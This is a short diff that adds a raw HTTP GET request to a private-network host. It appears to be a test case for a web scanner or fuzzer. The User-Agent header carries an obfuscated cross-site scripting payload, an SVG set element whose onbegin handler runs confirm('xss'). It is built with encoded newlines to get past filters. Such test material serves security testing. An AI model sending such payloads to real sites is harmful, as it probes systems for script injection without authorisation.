@@ -1,0 +1,7 @@
+GET / HTTP/1.1
+Host: 10.20.186.207:1111
+User-Agent: <SvG><set%0Aonbegin%0A=%0aa=confirm;a%28%60xss%60)/x>
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: close
+
